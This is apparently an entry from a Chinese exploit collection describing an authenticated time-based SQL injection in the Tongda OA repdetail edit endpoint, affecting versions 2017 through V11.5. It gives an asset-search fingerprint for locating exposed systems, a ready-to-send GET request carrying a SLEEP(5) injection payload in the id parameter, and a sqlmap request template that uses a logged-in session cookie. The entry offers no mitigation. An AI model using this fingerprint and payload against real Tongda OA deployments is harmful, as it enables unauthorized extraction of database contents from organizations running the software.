# 通达OArepdetail存在后台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/appbuilder/web/report/repdetail/edit?id=11%20OR%20(SELECT%206476%20FROM%20(SELECT(SLEEP(5)))XVdJ)&link_type=false&slot={} HTTP/1.1`

**请求体 / payload**
```
利用条件：可登录系统的账户，普通权限即可\

登陆后台使用获取到的cookie进行测试
Host: {hostname}
Cookie: {cookie}

sqlmap
GET /general/appbuilder/web/report/repdetail/edit?id=11&link_type=false&slot={} HTTP/1.1
Host: {hosename}
Cookie: {cookie}
```

**其他**
- 通达OA repdetail存在后台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017-通达OAV11.5